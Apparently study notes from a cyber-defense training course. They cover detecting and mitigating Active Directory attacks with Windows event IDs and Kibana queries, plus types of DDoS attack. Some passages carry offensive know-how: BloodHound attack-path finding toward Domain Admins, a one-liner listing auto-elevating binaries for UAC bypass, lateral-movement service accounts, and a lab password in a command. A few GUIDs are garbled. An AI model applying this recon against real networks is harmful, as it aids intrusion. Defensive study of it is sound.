- **PowerShell Empire** is a robust, post-exploitation framework that includes a **PowerShell 2.0 Windows agent** and a **pure Python 2.6/2.7 Linux agent**, which allows users to run several modules with capabilities including **privilege escalation**, **data collection**, and **persistence** on supported hosts.
- It supports **Metasploit Framework (MSF) integration** as well.
- MITRE ATT&CK has PowerShell Empire listed under the **tool ID S0363**.
- Supported modules of note are **Mimikatz**, **PowerSploit**, and **Invoke-BypassUAC**, which is a collection of **UAC Bypass techniques**. 

### Using AD Tools
1. Open _BloodHound_ and log in via given credentials
2. Change the display settings by selecting the gear icon and setting the following settings:
   - **Node Collapse Threshold**: Default (5)
   - **Edge Label Display**: Always Display
   - **Node Label Display**: Always Display. This option can also be toggled by entering the CTRL key.
   - **Query Debug Mode**: Default (Unselected)
   - **Low Detail Mode**: Default (Unselected)
   - **Dark Mode**: Default (Unselected)
3. Right-Click the _Domain Admins_ group
   - The options are as explained:
      - Set as Starting Node: The location to start from within the domain. For example, if you had a subnet that consisted of standard users who could potentially fall victim to a phishing or drive-by attack, then you would set one of these users as your starting point.
      - Set as Ending Node: The location to end at from within the domain. This is your high-value target to which you would like to gain access (e.g., they have intelligence value or they are a privileged user).
      - Shortest Paths to Here: Calculates all shortest paths to this node. Depending on the size of the database, this operation may take some time. The shortest path is typically the path of least resistance to gaining access to the system or user from a red team perspective.
      - Shortest Paths to Here from Owned: Calculates all the shortest paths to this node from the nodes that you marked as owned. For example, you manage to compromise a standard user via a phishing email. You mark them as owned to record that you have access to the user. You then use this functionality to check the shortest path to compromise a domain administrator in this case.
      - Edit Node: Edit the data associated with the node.
      - Mark Group as Owned: Allows the user to record an object as exploited, which enables other features such as Shortest Paths to Here from Owned as well as provides parameters for prebuilt queries.
      - Unmark Group as High Value: High-value groups are indicated with the gem icon. There are also pre-built queries that find the shortest path to exploiting high-value targets. Unsurprisingly, the Domain Admins group is automatically marked as high-value.
      - Delete Node: Deletes the node from the Neo4j database.
4. Select _DOMAIN ADMINS@CONTOSO.LOCAL_
5. Select the _Database Info_ tab. This displays info about the datbase, along with useful metadata. (ON PREM OBJECTS gives a count of types of objects in the database)
6. Select the _Analysis_ tab. This stores useful pre-built quieries to examin the database.
7. Select _Find Shortest Paths to Domain Admins_ and then Select _DOMAIN ADMINS@CONTOSO>LOCAL_

### Effectively Detecting COmpromises in AD
- As per Microsoft’s recommendations, a successful audit policy has the following attributes for effectively detecting compromises:
   - High likelihood that occurrence indicates unauthorized activity
   - Low number of false positives
   - Occurrence should result in an investigative/forensics response
- Two types of events should be monitored and generate alerts:
   - Those events in which even a single occurrence indicates unauthorized activity
   - An accumulation of events above an expected and accepted baseline
      - In the first case, these events should never — or rarely — occur, so a single event should be investigated.
         - An example of this is if your organization has a policy that states domain administrators should never log on to another host that is not a DC, yet a logon event for a domain administrator occurs on an end-user workstation.
      - The second case is more complex to configure, and requires an understanding of typical user and system behavior within a network environment.
         - An example of the second case is hitting a threshold for failed logons to detect password brute forcing attacks.
- Attached is a list of Microsoft’s recommendation for events that should be investigated for further context (see Appendix L — Events to Monitor).
- A Potential Criticality of High warrants investigation.
- Potential criticalities of Medium or Low should only be investigated if they occur unexpectedly or in numbers that significantly exceed the expected baseline in a measured period of time.

<img width="963" height="1057" alt="c76f5a0a-6b14-4988-b7a9-b5ada903a831" src="https://github.com/user-attachments/assets/0e306106-c68e-4822-ba02-e01b29452238" />

### Generally Useful WinEvent Log IDs
- The Windows Security event log is a good starting point for detecting Malicious Cyberspace Activity (MCA) on a host.
- Windows Security event logs are also commonly forwarded to a Security Information Event Manager (SIEM).
- Once MCA has been detected, these security event IDs may further illuminate what the adversary did while they were in the network.

- **Event ID 4624** — An account was successfully logged on:
   - When an account successfully authenticates and a session is generated, this event is generated.
   - Information in the event includes who logged on, what method they used to log on (e.g., over the network or locally), and their privilege level.
   - These event logs are very useful for monitoring who was logged on before an incident occurred, which may provide a lead to finding other MCA.

- **Event ID 4625** — An account failed to log on:
   - This event is generated if an account logon attempt failed when the account was already locked out.
   - It also generates for a logon attempt after which the account was locked out.
   - Adversaries may generate these logs when attempting to access different user accounts without the necessary credentials.

- **Event ID 4648** — A logon was attempted using explicit credentials:
   - This event occurs when a process attempts a logon by explicitly stating that account’s credentials.
   - Normal occurrence of this may occur during batch jobs, using the runas command, WinRM logins, etc.
   - These events may raise more flags if a privileged account was associated with the credentials.
   - If **switching logins during a session, an event code 4648 is likely generated**.

- **Event ID 4663** — An attempt was made to access an object:
   - This event indicates that a specific operation was performed on an object.
   - An object is defined as either a **filesystem**, **filesystem object**, **kernel**, **registry object**, or **removable device**.
   - This event can illuminate what files or data the adversary was trying to access on the target.

- **Event ID 4688** — A new process has been created:
   - Documents each program or process that a system executes, its parent process, the user that spawned the process, privilege level, etc.
   - While these events may generate a lot of noise, they are very useful in determining what occurred during an attack.

- **Event ID 4672** — Special privileges assigned to new logon:
   - Tracks whether any special privileges were associated with new logons.
   - This is another noisy event since every logon of SYSTEM triggers this event.
   - In accordance with monitoring privileged accounts, however, this event could provide valuable accountability and correlation data, e.g. which account initiated the new log on.

#### Powershell logging
- PwwerShell maintains its own event logs outside of Windows Security event logs.
- Event IDs from the PowerShell logs of note include:
   - **Event ID 4103**: Corresponds to Module Logging.
      - Module logging records pipeline execution details as PowerShell executes including variable initialization and command invocations.
      - Module logging records portions of scripts, some deobfuscated code, and some data formatted for output.
      - This logging captures some details missed by other PowerShell logging sources, though it potentially may not capture the commands executed.
   - **Event ID 4104**: Corresponds to PowerShell script block logging, which is not enabled by default.
      - Script block logging records blocks of code as they are executed by the PowerShell engine, and captures the full contents of code executed by an attacker including scripts and commands.
      - It captures the output of deobfuscated commands unlike event ID 4103.
      - NOTE: Updated versions of Windows Management Framework (version 4.0 or 5.0 depending on your OS) may need to be installed to enable enhanced PowerShell logging.

### Attacks and Identification Strategies
- After the CDA detects a breach, they need to determine the actions undertaken on the target and how they were accomplished.
- How did the adversary gain domain administrator privileges? How did they circumvent UAC?
- The following list provides attack detection for common attacks that occur within AD environments discussed in previous tasks.
- The presence of these events on their own is not indicative of an attack; the events need contextualization from earlier alerts to which a CDA can associate these events and determine an attack has occurred.
   - **Kerberoast**: This can be detected under **event ID 4769** — A Kerberos service ticket was requested.
      - If the **TicketEncryptionType is 0x17** in the event, it means the ticket is encrypted with the **Rivest Cipher (RC) 4 cipher**, which is a weaker algorithm that an adversary can break more easily.
   - **DCSync**: Artifacts generated include events with the **ID 4662** — An operation was performed on an object, and the following possible Globally Unique Identifiers (GUID) and their associated control access right:
      - **1131f6ad-9c07-11d1-f79f-00c04fc2dcd2**: Directory Service (DS) Replication Get Changes
      - **1131f6ad-9c07-11d1-f79f-00c04fc2dcd2**: DS Replication Get Changes
      - **All9923a32a-3607-11d2-b9be-0000f87a36b2**: DS Install Replica
      - **89e95b76-444d-4c62-991a-0facbeda640c**: DS Replication Get Changes in Filtered Set
      - A GUID is Microsoft’s implementation of a universally unique ID for distributed computing, which identifies COM object and class interfaces.
      - NOTE: **Event ID 4662 may not be enabled by default** as it is a noisy event, and may require a registry revision to begin generating events.
   - **PtH**: Recall that NTLM authentication needs to be used for a PtH attack to be successful.
      - Logon attempts with NTLM authentication may be suspect.
      - To detect PtH techniques, consult **event ID 4624** — An account was successfully logged on, and **4648** — A logon was attempted using explicit credentials.
      - On the **source** that initiates the login, there is an **event ID 4624 with a logon type 9**, which is a **NewCredential logon type**, and a logon process of **SecLogo**, as well as an **event ID of 4648**.
      - On the **target** that the adversary is attempting to log on to, there is another **event ID of 4624 with a logon type 3**, which means it was an **NTLM logon**.
      - On the **DC**, there is an **event ID of 4768** — A Kerberos authentication ticket or TGT was requested, **4769** — A Kerberos service ticket was requested, and **4776** — The computer attempted to validate the credentials for an account.
   - **PtT**: Since this attack allows the attacker to masquerade as a user by stealing a ticket rather than requesting a ticket, it is difficult to detect such an attack as their activity would appear as the legitimate user’s activity.
      - However, users are allowed to renew tickets for up to seven days, which an adversary would likely do to prolong their access within the network and generates an **event ID 4770** — A Kerberos service ticket was renewed.
      - The CDA needs to correlate these events with alerts and further analysis to determine that PtT occurred.
      - Regardless, if a user account was compromised, the CDA can assume their ticket and their credentials were compromised.
   - **Unconstrained/Constrained Delegation**: Delegation, at its core, simply allows for ticket reuse.
      - If an adversary was able to compromise a target with delegation privileges, then they would be able to extract the TGTs of users connecting to that computer.
      - Attacks leveraging ticket reuse have the same identification strategy as PtT attacks.
   - **Golden Ticket Attack**: These attacks are also difficult to detect.
      - An indication of a Golden Ticket Attack can be seen by checking the expiration date of a suspected forged TGT.
      - The Microsoft default is 10 hours, but a forged TGT may have an expiration date much further in the future, as tools such as Mimikatz set longer expiration dates by default.
      - In addition, some forged TGTs may be formatted differently from legitimate TGTs if the adversary did not make the effort to mimic the structure of an existing ticket.
      - In the case of a more sophisticated adversary that attempts to blend in, the absence of logs in this case would be a giveaway if ticket forgery occurred.
      - A user typically acquires a TGT from the DC’s Authentication Service (AS), which involves an AS Request from the client, and a AS Response from the server.
      - This results in an **event ID of 4768** — A Kerberos authentication ticket (TGT) was requested.
      - The absence of this event ID points toward ticket forgery, but needs correlation with other logs to confirm that this attack occurred.
   - **Silver Ticket Attack**: Silver ticket forgery omits more authentication steps; no TGT is needed so the first two steps can be ignored.
      - The next step of presenting a TGT to the Ticket Granting Service (TGS) for a service ticket and receiving one in this case is omitted as well.
      - In short, no communication occurs with the DC when forging a service ticket.
      - This means there would be an **absence of event IDs 4768 and 4769** when they should exist, correlated with any event logs that exist on the server that received the forged ticket.
   - **UAC Bypass**: This can be detected through process tracing, which appears under **event ID 4688**.
      - The following command finds binaries that automatically elevate from a user-level context to an administrative context:
         - `Strings -sc:\windows\system32\*.exe | findstr /I autoelevate`
- Binaries used in the past include eventviewer.exe and sdclt.exe. Sdclt.exe is a process associated with Windows Backup and Restore functionality.

<img width="963" height="963" alt="b89decba-ff6a-41f1-9bd9-ccdd42c99268" src="https://github.com/user-attachments/assets/f4412625-46f6-4589-9deb-3b94418642fd" />

- Using other native features of Windows OSs also generates log entries.
- Much of the native features have their own event logs which usually provide more detail than the security logs.
- Once you have an idea of which applications they exploited, you can search these logs for further information for lateral movement.
- This list is not all inclusive.
   - **SMB**
   - **RDP**
   - **WinRM**
   - **WMI**

### Identify AD Attacks
- In this task, use the Elastic Stack to examine artifacts left from a few common AD attacks.
- The attacks covered are:
   - Kerberoast
   - DCsync
   - PtH
- In addition, observe events of interest related to **command execution**, **lateral movement**, and **persistence**.

1. Log into Kibana, go to the discover page, and enter the timerange as specified by the Intel
2. Examine a Kerberoast attack first
3. Filter for `event.module:windows_eventlog and event.code:4769`
   - Toggle the following fields:
      - winlog.event_data.ServiceName
         - Name of the service or resource to be accessed. This can be a computer account or user account.
      - winlog.event_data.TargetUserName
         - Account attempting to access the resource. This can be a computer account or user account.
      - winlog.event_data.TicketEncryptionType
         - Encryption type that is obfuscating the ticket contents.
         - Table 16.3-4 lists ticket encryption types from Microsoft documentation:

           <img width="962" height="699" alt="4b809dd5-c481-4828-9174-5bc424f79e6c" src="https://github.com/user-attachments/assets/68732257-373b-437a-b608-23d39dc9f113" />

### Identify AD Attacks | Kerberoasting
- Kerberos utilizes symmetric key encryption to maintain confidentiality (i.e., the same key to encrypt and decrypt data).
- The key is oftentimes derived from the password hash, though this depends on the cipher-suite selected, which is determined by the Ticket Encryption Type.
- Both ticket encryption types of **0x12** and **0x17** use **hashes to encrypt**.
- The cipher-suite associated with ticket encryption type 0x17 uses Rivest Cipher 4 (RC4) and Message Digest 5 (MD5).
- RC4 is a fast encryption algorithm that has existed since the 1990s, and has been associated with a few notable security vulnerabilities, particularly with the Wireless Fidelity (Wi-Fi) standard Wired Equivalent Privacy (WEP).
- The hashing algorithm used with this ticket encryption type is MD5, which has been deemed cryptographically insecure.
- The cipher-suite associated with ticket encryption type 0x12 uses Advanced Encryption Standard 256 (AES256) and Secure Hashing Algorithm 1 (SHA1).
- AES256 is a more modern encryption algorithm that is harder to break; the 256 denotes that the key length is 256 bits.
- SHA1 is the hashing algorithm used, and is a stronger hashing function than Message Digest (MD) 5.
- Tickets with the encryption types 0x17 are much easier to brute force, which allows an adversary to expand their access within the network.
- Kerberoasting typically involves tickets with 0x17 as they are the most susceptible to cracking.
- Some common service accounts that are likely to allow lateral movement as per ADsecurity.org are:
   - **Advanced Group Policy Management (AGPM) Server**: Often has full control rights to all GPOs
   - **Microsoft Structured Query Language (SQL) Server (MSSQL)/MSSQLSvc**: Administrator rights to SQL server(s), which often have interesting data
   - **Forefront Identity Manager (FIM) Service**: Often has administrator rights to multiple AD Forests
   - **Security Token Service (STS)**: VMWare SSO service that could provide backdoor VMWare access.
      - Adversaries also often only search for accounts with administrative privileges.
- In addition, the user requesting the tickets made several other service ticket requests within a very short time frame (within seconds), which is not typical user activity.
- This activity would very likely be related to Kerberoasting.

### Identifying AD Attacks | DCSync
1. Run the query `event.module:windows_eventlog and message:"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"` (This looks for **DC Replication**)
2. Toggle the fields **winlog.event_data.SubjectDomainName and user.name**
   - **winlog.event_data.SubjectDomainName**
      - The domain name of the replicated domain. If there are multiple domains in a forest, then this field denotes which domain was replicated
   - **user.name**
      - The username of the account that requested a DCSync.
3. Expand the _Message_ field, this gives information on the alert that occured.

### Identifying AD Attacks | Pass-The-Hash
1. Run the query `event.module:windows_eventlog and event.code:4624 and winlog.event_data.LogonType:9 and winlog.event_data.LogonProcessName:SecLogo`
2. Toggle the following fields:
   - **user.name**
   - **winlog.computer_name**
   - **winlog.event_data.Subject**
   - **LogonID**
   - **winlog.event_data.TargetLogonID**

### Identifying AD Attacks | Correlation
1. Run the following query to find activity associated with the new session: `winlog.event_data.SubjectLogonId:0x32e6b93`
2. Toggle the **event.code** field

### Identifying AD Attacks | PowerShell Usage
1. Sort the previous events in ascending order
2. Toggle the **winlog.event_data.NewProcessName** and **winlog.event_data.CommanLine** fields
3. Go to the 4648 event code and look at the _Message_ field
   - The user is now attempting to authenticate to an administrator account in the domain on a DC whereas before it was limited to a local account.
   - The associated process name was powershell.exe
4. Deselect the two fields and run the query `event.code:4103 and winlog.user.name:patricia.hans and host.name:"cda-exec-3"`
   - **EVENT CODE 4103**: PowerShell cmdlet was executed
5. Toggle the **winlog.event_data.Payload** field to see the cmdlet and switches utilized
6. Add `and (message:"cda-dc" or message:174.16.1.6)` to the query
   - THis does not tell us who is running the session, but based on the previous **4648** code for using explicit credentials, we assume that _Patricia.Hans_ is using the ADMIN Credentials
7. Run the following to determine the commands the attacker used on the DC: `event.code:4103 and winlog.user.name:administrator and host.name:"cda-dc.cda.corp"`
8. Toggle the **winlog.event_data.ContextInfo** field
   - Viewing this shows us that `C:\windows\system32\wsmprovhost.exe -Embedding` was ran on the server-side of a WinRM session.

### Implementing Mitigations in AD
- Microsoft provides many general recommendations for protecting AD against compromises.
- Some of their security principles include: 
#### Protect Privileged Accounts
- From the common AD attacks chain, it becomes clear that privileged accounts pose a potential liability to network security.
- Once a privileged account becomes compromised, it becomes trivial to move across the domain.
- These accounts include:
   - **Local administrators**
   - **Domain administrators**
   - **Enterprise administrators**
- Other built-in accounts that a CDA may want to safeguard include:
   - **Account operators**: Members can administer domain user and group accounts.
   - **Schema administrators**: A universal group in the forest root domain with only the domain's built-in Administrator account as a default member; similar to the Enterprise Administrator group.
      - Membership in the Schema Administrator group can allow an attacker to compromise the AD schema.
   - **KRBTGT**: The KRBTGT account is the service account for the Kerberos Key Distribution Center (KDC) in the domain.
      - This account has access to all account credentials stored in AD.
      - This account is disabled by default and should never be enabled.
   - **Print operators**: Members of this group can administer domain printers.
   - **Read-only Domain Controllers (RODC)**: Contains all read-only DCs.
   - **Replicator**: Supports legacy file replication in a domain.
   - **Server operators**: Group members can administer domain servers.
   - **Backup operators**: Members of this group can override security restrictions for the purpose of backing up or restoring files.
- Use privileged accounts for only administration or their intended purpose.
- A policy can be implemented that requires administrators to have a user account and a separate administrator account, which is only used for activities that require administrative privileges.
- MITRE ATT&CK also has Privileged Account Management as a mitigation technique under the **identifier M1026**.

#### Implement Principle of Least Privilege
- From the Microsoft Windows Security Resource Kit:
   - Always think of security in terms of granting the least amount of privileges required to carry out the task.
   - If an application that has too many privileges should be compromised, the attacker might be able to expand the attack beyond what it would if the application had been under the least amount of privileges possible.
   - For example, examine the consequences of a network administrator unwittingly opening an email attachment that launches a virus.
   - If the administrator is logged on using the domain administrator account, the virus will have Administrator privileges on all computers in the domain and thus unrestricted access to nearly all data on the network.
- Attackers are likely to follow the path of least resistance — there is even a tool dedicated to finding it that was covered earlier this lesson — which involves abusing simple mechanisms such as privilege overreach. 

#### Consider Using a Secure Administrative Host
- A Secure Administrative Host is a workstation or sever that has been configured for the purpose of creating a secure platform from which privileged accounts can perform administrative tasks.
- Secure Administrative Hosts are dedicated solely to administrative functionality, and do not have extraneous applications such as email clients, productivity software, or web browsers.
- In addition, multi-factor authentication is often used on these hosts via enabling smart cards.

#### Configure an Audit Policy
- If an adversary is determined — with enough time and resources — they are likely to succeed; all it takes is one user clicking on a phishing email after all.
- Having a good audit policy in place allows the network defender to quickly identify which accounts and machines are compromised.
- Configuring an audit policy for privileged accounts is essential as these accounts have high potential to cause damage.
- MITRE ATT&CK also has auditing as a mitigative measure under the **technique ID M1047**.

#### Secure DCs
- DCs provide physical storage for AD Directory Services (AD DS) databases.
- Securing DCs involves both technical and physical measures.
- This involves maintaining network segmentation, keeping the latest version of Windows, implementing RDP restrictions, blocking internet access, etc.
- In the case that these measures are not enough, the DC needs regular backups, as the only way to be sure that a compromise was remediated is to restore it to a last-known good state.
- MITRE ATT&CK lists AD configuration as a mitigative measure, under **technique ID M1015**.

- There are also a few Security Technical Implementation Guides (STIG) for AD that provide recommendations for a baseline of security.
- Many of the recommendations overlap with Microsoft’s recommendations. The high severity findings for Administrative Sensitive machines are:
   <img width="965" height="1536" alt="bf5bde60-2ce7-4e5d-86e2-e4b98101efd0" src="https://github.com/user-attachments/assets/52c6efb7-22c1-44da-b10a-9bfc4db4ef81" />

### Thwarting Common AD Attacks
- While common sense says to just disable unneeded services, several attacks target essential functions of AD that cannot be disabled.
- Defending against these attacks is usually not as simple as disabling a service.

#### Kerberoast
- Microsoft provides a feature known as Managed Service Accounts (MSA) to maintain service accounts.
- A Standalone Managed Service Account (sMSA) is a managed domain account that provides automatic password management, simplified SPN management, and the ability to delegate management to other administrators.
- Group Managed Service Accounts (gMSA) take this feature a step further by extending the functionality over multiple servers.
- When this feature is configured, the password for service accounts becomes significantly more difficult to brute force.
- In addition, the password is also automatically changed after a specified time interval, further reducing the incidence of password brute force attempts.

#### Pass-the-Hash
- PtH attacks require local administrator privileges to execute.
- Disabling or locking down the local built-in administrator account on hosts within the domain help prevent adversaries from using the account.
- In addition, adversaries have a harder time extracting hashes from the local machine, since administrative privilege is needed to pull them out of memory.
- In addition, using different accounts on local administrator accounts makes it more difficult for an adversary to leverage the local built-in administrator account on each workstation.

#### Pass the Ticket
- Unfortunately, PtT attacks are impossible to prevent as they are an integral part of AD functionality.
- If an adversary can compromise an account, they can compromise the TGT of a user.
- If this attack is discovered, then the ticket can be destroyed by using the klist purge command.
- Analysis would have to be performed to determine the extent of the access gained by the adversary, but at a minimum, the user account password should be reset.

#### DCSync and Unconstrained Delegation
- For attacks such as DCSync and Unconstrained Delegation, limit the amount of privileges users have to only those absolutely required to perform their job role.
- Case in point, standard users should not have Replicating Directory Changes.
- If delegation is needed in an environment, whitelist the services that can be delegated.
- In addition, ensure that privileged accounts cannot delegate privileges to prevent attackers from stealing tickets with administrative privileges.
- The users that have Replication privileges can be found using the following command, where $DOMAIN is the domain’s Fully Qualified Domain Name (FQDN), and $GUID is one of the four GUIDs mentioned previously.
   - `Get-ACL "AD:$DOMAIN" | Select-Object -Expandproperty access | Where-Object -property ObjectType -eq "$GUID"`
- Figure 16.3-40 is an example of the output of the command being run with the DS Replication Get Changes GUID of 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.

<img width="1680" height="880" alt="538541f8-57ed-4573-a7e5-5690bf2fa29c" src="https://github.com/user-attachments/assets/ff9593a8-07d4-49b7-a735-278748c5423f" />

#### Golden/Silver Ticket Attacks
- If an adversary was able to compromise the KRBTGT password hash, then they have had complete access to the machines within the AD domain, which includes the DC. If the DC has been compromised, then the best course of action is to restore the DC to the last-known good state.
- To contain the impact of a Golden Ticket attack, the following actions need to be taken:
   - The KRBTGT account password should be reset
   - The administrator should force replication
   - The administrator needs to reset the password again
- The password needs to be reset twice because AD stores the current and previous password hashes, and in turn, tickets are still valid after one password reset.
   - Resetting the password twice in quick succession breaks synchronization between DCs, which is why replication needs to be forced between DCs before resetting the password again.
- Once these actions are performed, if the adversary uses the previous Golden Ticket to generate any TGTs, then an **event ID 4769** is generated.

#### UAC Bypass
- While there are mechanisms to circumvent UAC, the highest setting should still be configured which is not the default setting.
- As per MITRE ATT&CK, if the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. To monitor UAC Bypass, refer to process auditing logs.

### Implementing Mitigations in AD
- The mission partner, CDA Corporation, requests CPT assistance securing their networks. They provided the following information:
   - There should be six domain administrators in the Domain Administrators group:
      - Administrator
      - Andrew.Oconnor
      - Patti.Mcclure
      - John.Doe
      - Leonard.Blevins
      - Trainee (temporary account for the CPT)
   - The mission partner wants to follow Microsoft’s recommendations for securing their Domain Administrators and Local Administrator accounts.
1. Open PowerShell as Administrator
2. Run `Get-ADGroupMember "Domain Admins"
3. Delete the old user: `Remove-ADUser -Identity Jackie.Ruiz -Confirm:$False`
4. Remove other user account from Domain Admins Group: `Remove-ADGroupMember -Identity "Doman Admins" -Members Lucia.Hammond -Confirm:$False`
5. Verify group Members
6. Check delegation property for Domain Admins Group: `Get-AdGroupMember "Domain Admins" | Get-AdUser -Property AccountNotDelegated | Format-Table Name,AccountNotDelegated`
7. Disable delegation for all Domain Admins: `Get-AdGroupMember "Domain Admins" | Set-AdUser -AccountNotDelegated $true`
8. Verify command was successful
9. Open GPM, right click cda.corp and select **Create a GPO in this domain and Link it here...**
10. Schedule a task using _trainee_ account: `schtasks /create /RU cda\trainee /RP "Th1s is 0perational Cyber Training!" /SC once /ST 00:00 /TN test_privs /TR notepad.exe`
11. Delete the task `schtasks /delete /TN test_privs`
12. Run the same command as _ADMIN_: `schtasks /create /RU cda\administrator /RP "Th1s is 0perational Cyber Training!" /SC once /ST 00:00 /TN test_privs /TR notepad.exe`
13. Delete the task again



# MOD 17
## DDOS Attacks & Defenses
### What is a DoS/DDoS Attack?
- _The Cybersecurity and Infrastructure Security Agency (CISA) defines a DoS Attack as an attack that has occurred when legitimate users are unable to access information systems, devices, or other network resources due to the actions of a malicious cyber threat actor._
- This loss of access can range from a **single service or machine** being inaccessible, up to an entire network.
- There are many different categories of DoS attacks, each with their own characteristics and varying degrees of impact.
- A **DDoS** attack is the same as a DoS, but is launched from **more than one attacker-controlled host**.
- Hosts used in a DDoS might be a from a large amount of attackers coordinating their attack, or from an army of unwitting bots under the control of a single attacker.

### Types of DoS/DDoS Attacks
#### Saturation
- On May 12, 2021, CDA.com external trainers mentioned issues accessing the new websites.
- Upon investigation in Arkime, network defenders noticed a significant spike in total data inbound from the internet, but found that the overall packet/session count was low.
- It appeared that a threat actor was trying to saturate the dedicated connection between these servers and the internet.

#### Volume Attacks
- Volume attacks are a type of DoS attack intended to **saturate** (i.e., use up) all the bandwidth available to an attacked site, host, or network segment.
- Volume attacks are very dependent upon the **overall connection bandwidth** of the target — a website hosted via a Digital Subscriber Line (DSL) link is easier to overwhelm than a website hosted via a cloud provider.
- An attacker with a **100 Megabits Per Second (Mbps) cable connection** may be able to overwhelm a DSL-hosted site, but a larger pooled-bandwidth attack is needed in order to overwhelm a cloud provider.
- Alternatively, a large-scale DDoS attack may be able to overwhelm the cloud provider.

#### Viewing this attack
1. Open up **arkime** and log in
2. Select _Packets_
3. Adjust timeframe to the desired timeline
4. Hone in on the timeframe of the Spike
5. Scroll down and expand the packet of interest
   - NOTE: This is a capture of a Low Orbit Ion Cannon (LOIC) executing a default UDP DDoS attack from 104.53.222.21. LOIC is an open-source network stress testing tool that can be used to perform a denial-of-service attack.

     <img width="1397" height="549" alt="4857a814-aebc-4426-9b12-ce58c5d06775" src="https://github.com/user-attachments/assets/d079d88a-5dd1-4a8d-ba24-df8b88de9ffa" />

### Pivoting to Zeek
- Since the Arkime and Security Onion sensors have overlapping coverage of the network traffic, the defenders can pivot to Security Onion with the information gleaned from the Arkime findings
- Zeek logs are flat text files that are created on the network sensor.
  - These files are then ingested into Elastic where they can be queried using the Kibana interface.
  - Defenders can also query the Zeek logs directly on the sensor, but Kibana allows for a full view of all of the Zeek sensor output in one location.
1. Open up Kibana
2. Update your timeframe to the time of the attack
3. Filter down on zeek logs
4. Filter to only display the IP's external (`source.ip:104.53.222.1/24 AND destination.ip:104.53.222.1/24` in this case)
5. Filter for `zeek weird logs`
6. Update filter to add the Source and Dest Ports in question

### UDP Flood
- The multitude of UDP seen in the previous tasks is symptomatic of a volume-based UDP flood.
- In this case, the amount of packets was not enough to deny any service, but the attacker’s intent was clearly to do so.
- With only a single host attempting DoS, it is simple enough to set up a firewall rule to block the traffic.
- In a UDP flood, an attacker sends a plethora of UDP datagrams to a target.
- When the target receives the datagrams, it looks for an application associated with that port.
- If nothing is found, the target responds with a destination unreachable Internet Control Message Protocol (ICMP) packet.
- If the attacker sends more of these packets, they may eventually overwhelm the bandwidth of the target's network stack.
- UDP floods are frequently used against services like DNS or Voice over Internet Protocol (VoIP) to saturate the network stack on the target.
- The attacker can also utilize UDP datagrams to trick a host into performing a DoS against a different host.
- By spoofing the source IP of the UDP datagrams, all destination unreachable ICMP responses from one host are sent to the spoofed source IP, which never actually sent any traffic.
- Additionally, this can be further magnified if an attacker coordinates multiple systems (such as through a botnet) to deliver UDP flood attacks against a multitude of hosts at the same time — with them all spoofing the same source IP address.
- This tactic is known as a Distributed Reflective Denial of Service (DRDoS) attack.
- DoS attacks can also be described as amplified when the request for data is much smaller than the actual response.
- For example, if an attacker sent a request for all the DNS entries associated with isc.org, it would be a request of around 64 bytes.
- The response would be over 3,000 bytes, which would net an amplification 50 times higher based on the initial request.
- These types of attacks are very lucrative for attackers who are trying to overwhelm the bandwidth of a victim.

### ECHO ECHO ECHO
- CDA.com administrators also noted a spike in ICMP traffic within Arkime around 08:00 on May 12, 2021.
- The defender searched for `ip.protocol == icmp` within Arkime and was able to spot a spike in the session counts in the timeline.
- The following steps can be followed in order to analyze this spike.
  1. Adjust timeframe in Arkime
  2. Filter for `ip.protocol == icmp`

### ICMP Flood
- In an ICMP — or Ping — flood, an attacker overwhelms a target’s computer with ICMP echo requests, which are also known as pings.
- ICMP floods are generally a one-for-one packet — each packet sent by the attacker is met with a responding packet from the target.
- Because the attacker has to send more packets than the target can handle, this degrades the attacker's network connection as well as the target's.
- The attacker can spoof the source address so that the target does not respond directly to the attacker, but the attacker must still send enough traffic to overwhelm the target.
- The target thus receives echo requests and responds with echo replies, while the attacker only sends echo requests. The unwitting spoofed source IP receives unsolicited ping replies, as well.
- ICMP Type 8 for this attack

#### Indicators
  - Large quantity of ICMP packets with large byte count

#### Mitigations/Countermeasures
  - Block or drop ICMP messages from particular IP addresses
  - Block or drop all ICMP packets from Wide Area Networks (WAN)

### Protocol Attacks
- Protocol DoS/DDoS attacks are similar to volume-based attacks, but have one key difference — protocol attacks overflow other resources available on the network device, rather than just the bandwidth.
- Examples of resources that may be affected during a protocol attack are resources like **memory**, **Process Identifiers (PID)**, **ports**, or **sockets**.


#### Description
- DDoS attacks have the ability to overwhelm a target just by the sheer volume of requests.
- In protocol attacks, bandwidth usage remains within normal ranges, but the overall request count is still abnormally high.
- These requests consume all available connections, PIDs, or other resources needed by the servicing application, resulting in valid users being unable to access or use the service.
- An analogy for this behavior would be having an entire school of students going to a fast food restaurant at the same time, but instead of ordering they are just asking questions about the menu when they get to the front of the line.
- Though some normal hungry patrons may make it to the front of the line eventually, the students are keeping all of the employees busy with questions.
- Eventually, the employees realize what the students are up to and send them all away, but until then, the establishment makes no money.

#### Indicators
  - Marked increase in requests to a host over baseline External site access time monitoring

#### Mitigations/Countermeasures
- Partition mission essential traffic via filter or Quality of Service controls
- Partition critical services from other online services or create load balanced capability for service

### Ping of Death Fragmentation Attack
- The Ping of Death fragmentation attack attempts to build an IP packet larger than maximum allowed size of 65,535 bytes.
- The attacker sends many smaller fragments of a packet, but when reassembled on the target host, the combined size of the IP datagram is over the maximum size. This leads to a crash, hang, or reboot on the target host.
- Modern OSs are all patched and no longer vulnerable to this type of attack, but depending on the volume of traffic, a Ping of Death could slow or stop legitimate traffic like the previously discussed volume-based attacks.

#### Indicators
- ICMP packets with very large payloadsNon-standard payload sections

#### Mitigations/Countermeasures
- All modern OSs have patches in place that defeat this attack, but be aware that any old, unpatched OSs should be filtered from receiving ping requests.

### Knock
- Defenders continue to look for more information associated with these DoS attempts against their newly provisioned web servers.
- The attackers were not overly successful, but they were persistent.
- Pivot over to the Kibana dashboard to analyze Zeek logs, and pinpoint TCP connections that only sent a Synchronize (SYN) request from the source, but not an Acknowledgment (ACK) response.
  1. Open Kibana, and click on the _Network_ Event Category
  2. Select _Connections_
  3. Modify timeframe as required
  4. Look at all of the _Security Onion - Connections - State_ pane
- Below is a list of Connection States:
  - **S0**: Connection attempt seen; no reply.S1: Connection established; not terminated.
  - **SF**: Normal establishment and termination. Note that this is the same symbol as for state S1. You can tell the two apart because for S1 there are not any byte counts in the summary, while there are for SF.
  - **REJ**: Connection attempt rejected.
  - **S2**: Connection established and close attempt by originator seen, but no reply from responder.
